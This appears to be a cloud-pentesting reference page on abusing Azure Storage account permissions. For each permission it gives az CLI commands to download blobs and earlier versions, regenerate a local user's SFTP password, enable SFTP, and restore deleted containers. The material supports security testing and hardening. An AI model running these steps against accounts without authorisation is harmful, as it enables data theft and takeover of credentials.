---
title: "Storage Accounts Explotation"
order: 52
description: Explotation of Storage Accounts
---

## List and download blobs

> This permission is needed:
> - **Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read**
>
> A principal with this permission will be able to list the blobs (files) inside a container and download the files which might contain sensitive information

```bash
az storage blob list \
  --account-name $STROAGE_ACCOUNT\
  --container-name <container-name> --auth-mode login

az storage blob download \
  --account-name $STROAGE_ACCOUNT \
  --container-name <container-name> \
  -n file.txt --auth-mode login
```

## Obtain previous versions

```bash
az storage blob list \
  --account-name $STORAGE_ACCOUNT \
  --container-name <container-name> \
  --include v \
  --query "[?name=='file.txt'].{versionId:versionId, isCurrent:isCurrentVersion, length:properties.contentLength}" \
  -o json
```

```bash
az storage blob download \
  --account-name $STORAGE_ACCOUNT \
  --container-name <container-name> \
  --name file.txt \
  --version-id "2026-05-12T13:33:13.8661978Z" \
  --file /tmp/file.txt
```

## Regenerate user's password

> This permission is required:
> - **Microsoft.Storage/storageAccounts/localusers/regeneratePassword/action**
>
>With this permission, an attacker can regenerate the password for a local user in an Azure Storage account. This grants the attacker the ability to obtain new authentication credentials (such as an SSH or SFTP password) for the user. By leveraging these credentials, the attacker could gain unauthorized access to the storage account, perform file transfers, or manipulate data within the storage containers. 

```bash
az storage account local-user regenerate-password \
  --account-name <STORAGE_ACCOUNT_NAME> \
  --resource-group <RESOURCE_GROUP_NAME> \
  --name <LOCAL_USER_NAME>
```

To access Azure Blob Storage via SFTP (is_hns_enabled should be true) using a local user via SFTP you can (you can also use ssh key to connect):

```bash
sftp <storage-account-name>.<local-user-name>@<storage-account-name>.blob.core.windows.net
```

## Enable the SFTP

> This permission is required:
> - **Microsoft.Storage/storageAccounts/write**
>
> This allow an attacker to enable SFTP.

Check if SFTP is enabled

```bash
az storage account show \
  --name $STROAGE_ACCOUNT \
  --resource-group $RESOURCE_GROUP \
  --query "isSftpEnabled"
```

```bash
az storage account update \
  --name $STROAGE_ACCOUNT \
  --resource-group $RESOURCE_GROUP \
  --enable-sftp true
```

## Restore a deleted container

> The following permissions are needed:
> - Microsoft.Storage/storageAccounts/restoreBlobRanges/action
> - Microsoft.Storage/storageAccounts/blobServices/containers/read
> - Microsoft.Storage/storageAccounts/read
> - Microsoft.Storage/storageAccounts/listKeys/action
>
> With this permissions an attacker can restore a deleted container by specifying its deleted version ID or undelete specific blobs within a container, if they were previously soft-deleted. 

Show the deleted containers:

```bash
az storage container list \
  --account-name $STROAGE_ACCOUNT \
  --include-deleted
```

Restore it

```bash
az storage container restore \
  --account-name $STROAGE_ACCOUNT \
  --name $CONTAINER_NAME \
  --deleted-version <version>
```